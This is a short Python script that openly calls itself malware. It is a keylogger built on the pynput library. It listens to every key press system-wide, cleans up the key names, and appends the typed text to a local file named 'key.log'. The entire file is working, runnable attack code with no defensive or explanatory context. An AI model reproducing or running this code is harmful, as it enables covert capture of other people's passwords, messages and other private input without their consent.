from pynput.keyboard import Listener
from time import sleep
import re

class keylogger():
    arquivoLog = 'key.log'
    def monitor(self, key):
        key = str(key)
        key = re.sub(r'\'', '', key)
        key = re.sub(r'Key.space', ' ', key)
        key = re.sub(r'Key.enter', '\n', key)
        key = re.sub(r'Key.*', '', key)
        with open(self.arquivoLog, 'a') as log:
            log.write(key)
    def malware(self):
        print('[x]Wait...')
        sleep(1)
        print('[x]Listening...')
        with Listener(on_press=self.monitor) as listner:
            listner.join()
            
k = keylogger()
k.malware()